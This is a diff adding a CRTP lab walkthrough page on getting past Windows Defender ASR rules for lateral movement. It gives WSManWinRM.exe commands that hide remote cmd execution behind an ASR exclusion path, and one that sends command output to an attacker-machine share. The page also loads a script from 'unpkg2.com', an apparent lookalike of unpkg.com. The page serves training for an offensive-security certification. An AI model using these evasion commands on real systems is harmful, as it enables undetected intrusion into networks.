@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ASR Rules Bypass (Lateral Movement) - CRTP</title>
+  <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    .project-sidebar { padding: 20px; }
+    .project-sidebar h3 { color: #ffdb70; margin-bottom: 15px; font-size: 1.1rem; }
+    .project-sidebar .portfolio-link { 
+      display: block; 
+      padding: 10px 12px; 
+      margin-bottom: 15px; 
+      color: #ffdb70; 
+      text-decoration: none; 
+      border-radius: 6px; 
+      font-size: 0.9rem; 
+      font-weight: 600;
+      background: #2a2a2a;
+      transition: all 0.2s;
+    }
+    .project-sidebar .portfolio-link:hover { 
+      background: #ffdb70; 
+      color: #1a1a1a; 
+    }
+    .project-sidebar a { 
+      display: block; 
+      padding: 8px 12px; 
+      margin: 4px 0; 
+      color: #d6d6d6; 
+      text-decoration: none; 
+      border-radius: 6px; 
+      font-size: 0.9rem; 
+      transition: all 0.2s; 
+    }
+    .project-sidebar a:hover { 
+      background: #2a2a2a; 
+      color: #ffdb70; 
+    }
+    .project-sidebar a.active { 
+      background: #ffdb70; 
+      color: #1a1a1a; 
+      font-weight: 600; 
+    }
+    
+    .notion-content { 
+      line-height: 1.6; 
+    }
+    .notion-content img { 
+      max-width: 100%; 
+      height: auto; 
+      margin: 20px 0; 
+      border-radius: 8px; 
+      box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+    }
+    .notion-content h1 { 
+      font-size: 1.8rem; 
+      margin: 30px 0 20px; 
+      color: #fafafa; 
+    }
+    .notion-content h2 { 
+      font-size: 1.5rem; 
+      margin: 25px 0 15px; 
+      color: #fafafa; 
+    }
+    .notion-content h3 { 
+      font-size: 1.3rem; 
+      margin: 20px 0 10px; 
+      color: #fafafa; 
+    }
+    .notion-content p { 
+      margin: 15px 0; 
+      color: #d6d6d6; 
+    }
+    .notion-content ul, .notion-content ol { 
+      margin: 15px 0; 
+      padding-left: 30px; 
+    }
+    .notion-content li { 
+      margin: 5px 0; 
+      color: #d6d6d6; 
+    }
+    .notion-content code { 
+      background: #2a2a2a; 
+      padding: 2px 6px; 
+      border-radius: 4px; 
+      font-family: 'Courier New', monospace; 
+      color: #ffdb70; 
+    }
+    .notion-content pre { 
+      background: #1e1e1e; 
+      border-left: 4px solid #ffdb70; 
+      padding: 15px; 
+      margin: 20px 0; 
+      border-radius: 0 8px 8px 0; 
+      overflow-x: auto; 
+    }
+    .notion-content a { 
+      color: #ffdb70; 
+      text-decoration: underline; 
+    }
+    .notion-content strong { 
+      color: #fafafa; 
+      font-weight: 600; 
+    }
+    .notion-content em { 
+      font-style: italic; 
+    }
+    .notion-content figure { 
+      margin: 20px 0; 
+    }
+    .notion-content figcaption { 
+      display: none; 
+    }
+    .main-content { 
+      max-width: 100% !important; 
+    }
+    .about { 
+      max-width: 100% !important; 
+      padding: 20px 40px !important; 
+    }
+    /* Critical: Code Block Formatting */
+    pre code {
+      white-space: pre;
+      word-break: normal;
+      overflow-x: auto;
+      display: block;
+      font-family: 'Courier New', monospace;
+      font-size: 0.9rem;
+      line-height: 1.5;
+    }
+  </style>
+</head>
+<body>
+  <main>
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">CRTP Walkthrough</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Navigation</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        <div class="project-sidebar">
+          <a href="../" class="portfolio-link">← Portfolio</a>
+          <h3>Sections</h3>
+           <a href="part-01.html">1. PowerShell Detection & Bypass</a>
+           <a href="part-02.html">2. Enumeration Tools</a>
+           <a href="part-03.html">3. Domain Enumeration Techniques</a>
+           <a href="part-04.html">4. Privilege Escalation (Derivative Local Admin)</a>
+           <a href="part-05.html">5. Golden Ticket</a>
+           <a href="part-06.html">6. Silver Ticket & WMI Abuse</a>
+           <a href="part-07.html">7. Diamond Ticket</a>
+           <a href="part-08.html">8. DCSync Attack</a>
+           <a href="part-09.html">9. AS-REP Roasting</a>
+           <a href="part-10.html">10. Unconstrained Delegation + Printer Bug</a>
+           <a href="part-11.html">11. Constrained Delegation</a>
+           <a href="part-12.html">12. Resource-Based Constrained Delegation (RBCD)</a>
+           <a href="part-13.html">13. Trust Enumeration & Abuse</a>
+           <a href="part-14.html">14. Cross-Forest Trust Attacks</a>
+           <a href="part-15.html">15. ADCS Attacks (ESC1, ESC3)</a>
+           <a href="part-16.html">16. Tools Transfer & Execution</a>
+           <a href="part-17.html">17. ASR Rules Bypass (Lateral Movement)</a>
+        </div>
+      </div>
+    </aside>
+
+    <div class="main-content">
+      <article class="about active" data-page="about">
+        <header class="h2 article-title">ASR Rules Bypass (Lateral Movement)</header>
+        <section class="about-text notion-content">
+          <h1>Lateral Movement – ASR Rules Bypass</h1></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8032-a4a1-fad9e9aaf670" class=""><strong>Attack Surface Reduction (ASR)</strong></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80d4-9ace-c7d7de51f17f" class="">Attack Surface Reduction (ASR) is a set of security controls in Windows Defender that restrict common malware and exploit techniques. <br/>ASR aims to minimize the attack surface by eliminating unnecessary functions, strengthening the overall hardening of services and features, tightening access controls, and updating software regularly.</p></div><div style="display:contents" dir="auto"><h3 id="30c79e9a-d7c9-80b3-9329-df17398bbd77" class="">ASR Rules</h3></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-806a-a964-edb16ee08feb" class="">ASR rules are part of the ASR controls in Defender. These rules are designed to block common activities associated with malicious activity, such as:</p></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-8026-92e4-fea245c1d0aa" class="bulleted-list"><li style="list-style-type:disc">Blocking Office applications from creating child processes</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-80ac-b6ce-c18363bcdb21" class="bulleted-list"><li style="list-style-type:disc">Blocking Office applications from injecting code into other processes</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-8005-ba06-c54a681ef38d" class="bulleted-list"><li style="list-style-type:disc">Blocking JavaScript or VBScript from launching downloaded executable content</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-802e-aedb-d6604dc43ceb" class="bulleted-list"><li style="list-style-type:disc">Blocking credential stealing from the Windows local security authority subsystem (lsass.exe)</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-80df-aa1d-dbb6e4a61f25" class="bulleted-list"><li style="list-style-type:disc">And many more.</li></ul></div><div style="display:contents" dir="auto"><h3 id="30c79e9a-d7c9-803b-be54-c2be5e35d8ef" class="">ASR States</h3></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80a8-b44f-c72e409036b0" class="">ASR rules can be configured in three states:</p></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-800f-9700-fca9060b9363" class="bulleted-list"><li style="list-style-type:disc"><strong>Not Configured</strong>: No action is taken.</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-8011-b4f9-f3741a8c71ff" class="bulleted-list"><li style="list-style-type:disc"><strong>Block</strong>: The rule blocks the specified activity.</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-80b8-9233-d0cdf3f5281c" class="bulleted-list"><li style="list-style-type:disc"><strong>Audit</strong>: The rule generates events for insights but does not block the activity.</li></ul></div><div style="display:contents" dir="auto"><h3 id="30c79e9a-d7c9-8083-9881-dac61ee4ff2d" class="">ASR Requirements</h3></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-807d-a83e-c39ff73d49e6" class="">To enable ASR rules, the following requirements must be met:</p></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-80f9-aec9-f6a24428bfd5" class="bulleted-list"><li style="list-style-type:disc">Windows 10 Pro, Enterprise, Education version 1709, and later</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-8011-b5d8-e0f1b29b97aa" class="bulleted-list"><li style="list-style-type:disc">Windows Server 2012R2/2016 supported using MDE unified agent</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-8067-b9f6-f9360d6215e8" class="bulleted-list"><li style="list-style-type:disc">Defender antivirus running in active mode</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-8031-8d32-cf48f19b3c72" class="bulleted-list"><li style="list-style-type:disc">Cloud-delivered protection recommended.</li></ul></div><div style="display:contents" dir="auto"><h3 id="30c79e9a-d7c9-805b-8691-cde3682850a9" class="">ASR Bypass</h3></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80df-aa72-dc740884791b" class="">Bypassing ASR rules can be achieved through various methods, including:</p></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-80f9-8405-e7f21739f725" class="bulleted-list"><li style="list-style-type:disc"><strong>Code Execution</strong>: Using code that can bypass ASR rules by downloading and saving files with different extensions or using command-line tools to move files to their real paths.</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-80e4-82d6-d4fa10dc1873" class="bulleted-list"><li style="list-style-type:disc"><strong>DLL Loading</strong>: Loading DLLs in a specific folder and calling Win32 API functions to bypass ASR rules.</li></ul></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80be-aadb-eb2dbb8f9138" class="">The use of <code>winrs</code> is not detected by MDE but MDI(Microsoft Defender for Identity) detects it.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8088-ab90-eb23fa20b92c" class="">To avoid detection, we can use the <code>WSManWinRM.exe</code> tool. We will append an ASR exclusion such as “<code>C:\Windows\ccmcache\</code>” to avoid detection from the &quot;Block process creations originating from PSExec and WMI commands&quot; ASR rule. Run the below command from the process spawned as dbadmin</p></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80f5-a153-c444f225f289" class="">NOTE: If the tool returns a value of 0, there is an error with command execution.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-803f-8cbe-d1f55b794394" class=""><code>C:\AD\Tools\WSManWinRM.exe eu-sqlx.eu.eurocorp.local &quot;cmd /c set username C:\Windows\ccmcache\&quot;</code></p></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8077-82b5-fc7da21e73b7" class="">To see the command output, we can redirect the command to our share file in out attacking machine. <br/>This has very limited success and we are continuously trying ways to make it more effective.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80df-b919-eb4c53391192" class=""><code>C:\AD\Tools\WSManWinRM.exe EU-SQL30.eu.eurocorp.local &quot;cmd /c dir &gt;&gt; \\DCORP-STD451.dollarcorp.moneycorp.local\MyShares\out.txt C:\Windows\ccmcache\&quot;</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-80bc-9121-c53956261569" class="image"><a href="images/screenshot_077.png"><img style="width:2160px" src="images/screenshot_077.png"/></a></figure></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80f2-8c65-e64a4716594d" class="">If you face the issue  on the screenshot below, you can install VC_redist.x64.exe and run WSManWinRM.exe.<br/>The link for download is the one below screenshot.</p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-80b6-ac0c-e647fd2ad2c5" class="image"><a href="images/screenshot_001.png"><img style="width:2160px" src="images/screenshot_001.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8029-80aa-c1ec86bbc60f" class=""><a href="https://learn.microsoft.com/en-us/cpp/windows/latest-supported-vc-redist?view=msvc-170">https://learn.microsoft.com/en-us/cpp/windows/latest-supported-vc-redist?view=msvc-170</a></p></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"></div></li></ul></div><div style="display:contents" dir="auto"></div></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
+        </section>
+      </article>
+    </div>
+
+    <script src="../assets/js/script.js"></script>
+    <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+    <script nomodule src="https://unpkg2.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+  </body>
+</html>
